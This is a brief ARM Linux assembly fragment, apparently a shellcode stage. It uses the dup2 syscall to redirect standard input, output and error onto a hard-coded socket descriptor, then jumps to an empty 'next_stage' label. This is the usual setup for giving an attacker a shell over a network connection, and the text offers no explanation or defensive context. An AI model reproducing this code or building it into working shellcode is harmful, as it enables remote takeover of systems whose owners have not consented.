.section .text
.global _start

_start:
dup2:
	add r4, pc, #(fd - . - 8)
	ldr r4, [r4]

    mov r0, r4
    mov r1, #0
    mov r7, #63
    svc 0

    mov r0, r4
    mov r1, #1
    mov r7, #63
    svc 0

    mov r0, r4
    mov r1, #2
    mov r7, #63
    svc 0

    b next_stage

fd:
.long 5

next_stage: